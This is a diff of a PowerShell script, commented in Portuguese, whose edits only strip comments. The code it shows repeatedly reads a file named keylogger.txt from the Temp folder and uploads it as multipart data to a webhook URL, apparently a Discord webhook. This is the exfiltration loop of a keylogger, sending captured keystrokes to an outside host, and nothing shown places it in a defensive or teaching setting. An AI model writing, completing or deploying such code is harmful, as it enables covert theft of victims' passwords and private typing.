@@ -61,18 +61,15 @@ $caminhoArquivo = "$env:Temp\keylogger.txt"
 while ($true) {
     if (Test-Path $caminhoArquivo) {
         try {
-            # Verifica se o arquivo está vazio (Discord rejeita arquivos de 0 bytes com erro 400)
             if ((Get-Item $caminhoArquivo).Length -eq 0) {
                 Write-Host "[$(Get-Date -Format 'HH:mm:ss')] ⚠️ Arquivo vazio. Pulando envio..." -ForegroundColor Yellow
             } else {
-                # Setup do formulário multipart
                 $Boundary = [System.Guid]::NewGuid().ToString()
                 $LF = "`r`n"
                 
                 $FileBytes = [System.IO.File]::ReadAllBytes($caminhoArquivo)
                 $FileName = [System.IO.Path]::GetFileName($caminhoArquivo)
 
-                # Montando o cabeçalho do arquivo
                 $Header = "--$Boundary$LF"
                 $Header += "Content-Disposition: form-data; name=`"file`"; filename=`"$FileName`"$LF"
                 $Header += "Content-Type: application/octet-stream$LF$LF"
@@ -80,10 +77,8 @@ while ($true) {
                 $HeaderBytes = [System.Text.Encoding]::UTF8.GetBytes($Header)
                 $FooterBytes = [System.Text.Encoding]::UTF8.GetBytes("$LF--$Boundary--$LF")
 
-                # Combinando tudo em um array de bytes
                 $FullBody = [Byte[]]($HeaderBytes + $FileBytes + $FooterBytes)
 
-                # Enviando a requisição
                 Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$Boundary" -Body $FullBody
                 
                 Write-Host "[$(Get-Date -Format 'HH:mm:ss')] ✅ Arquivo enviado com sucesso!" -ForegroundColor Green
